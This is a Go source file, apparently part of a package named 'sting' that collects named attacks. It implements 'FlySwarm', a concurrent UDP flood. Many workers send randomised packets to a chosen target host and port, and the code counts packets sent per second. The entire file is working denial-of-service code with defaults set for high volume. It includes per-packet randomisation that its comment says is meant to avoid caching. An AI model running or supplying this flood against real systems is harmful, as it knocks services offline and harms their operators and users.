package sting

import (
	"context"
	"crypto/rand"
	"fmt"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

// FlySwarm implements a UDP flood attack.
type FlySwarm struct{}

// NewFlySwarm creates a new FlySwarm attack instance.
func NewFlySwarm() *FlySwarm {
	return &FlySwarm{}
}

// Name returns the attack name.
func (f *FlySwarm) Name() string {
	return "FlySwarm"
}

// Description returns a brief description.
func (f *FlySwarm) Description() string {
	return "UDP flood - chaotic bombardment"
}

// Attack executes the FlySwarm UDP flood attack.
func (f *FlySwarm) Attack(ctx context.Context, target string, opts AttackOpts) (*Result, error) {
	if opts.Concurrency <= 0 {
		opts.Concurrency = 100
	}
	if opts.Rounds <= 0 {
		opts.Rounds = 10000
	}
	if opts.Port <= 0 {
		opts.Port = 80
	}
	if opts.PacketSize <= 0 {
		opts.PacketSize = 1024
	}

	// Construct the target address
	targetAddr := fmt.Sprintf("%s:%d", target, opts.Port)
	addr, err := net.ResolveUDPAddr("udp", targetAddr)
	if err != nil {
		return nil, fmt.Errorf("failed to resolve target address: %w", err)
	}

	var (
		successful atomic.Int64
		failed     atomic.Int64
		completed  atomic.Int64
	)

	start := time.Now()

	// Create a channel to distribute work
	jobs := make(chan int, opts.Rounds)
	var wg sync.WaitGroup

	// Pre-generate random payload
	payload := make([]byte, opts.PacketSize)
	rand.Read(payload)

	// Start workers
	for i := 0; i < opts.Concurrency; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()

			// Each worker gets its own connection
			conn, err := net.DialUDP("udp", nil, addr)
			if err != nil {
				// If we can't create a connection, mark all our work as failed
				for range jobs {
					failed.Add(1)
					completed.Add(1)
				}
				return
			}
			defer conn.Close()

			// Worker-specific random payload
			localPayload := make([]byte, opts.PacketSize)
			copy(localPayload, payload)

			for {
				select {
				case <-ctx.Done():
					return
				case _, ok := <-jobs:
					if !ok {
						return
					}

					// Randomize a bit of the payload to avoid caching
					rand.Read(localPayload[:min(16, len(localPayload))])

					_, err := conn.Write(localPayload)
					if err != nil {
						failed.Add(1)
					} else {
						successful.Add(1)
					}

					current := completed.Add(1)

					// Progress update every 1000 packets
					if opts.Verbose && current%1000 == 0 {
						elapsed := time.Since(start)
						pps := float64(current) / elapsed.Seconds()
						fmt.Printf("\r   Progress: %d/%d packets (%.0f pkt/s)", current, opts.Rounds, pps)
					}
				}
			}
		}(i)
	}

	// Send jobs
	for i := 0; i < opts.Rounds; i++ {
		select {
		case <-ctx.Done():
			break
		case jobs <- i:
		}
	}
	close(jobs)

	// Wait for all workers to complete
	wg.Wait()

	if opts.Verbose {
		fmt.Println() // Clear the progress line
	}

	return &Result{
		TotalRequests: int(completed.Load()),
		Successful:    int(successful.Load()),
		Failed:        int(failed.Load()),
		Duration:      time.Since(start),
	}, nil
}
